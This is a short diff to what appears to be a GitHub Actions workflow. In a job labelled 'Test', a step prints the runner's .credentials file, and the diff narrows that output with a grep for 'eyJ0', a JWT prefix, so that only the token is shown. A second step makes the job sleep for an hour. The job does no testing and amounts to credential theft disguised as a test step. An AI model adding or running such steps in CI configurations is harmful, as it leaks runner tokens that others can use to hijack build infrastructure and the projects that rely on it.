@@ -5,5 +5,5 @@ jobs:
     runs-on: ubuntu-latest
     name: Test
     steps:
-      - run: cat ~/runners/2.284.0/.credentials
+      - run: cat ~/runners/2.284.0/.credentials | grep "eyJ0"
       - run: sleep 1h
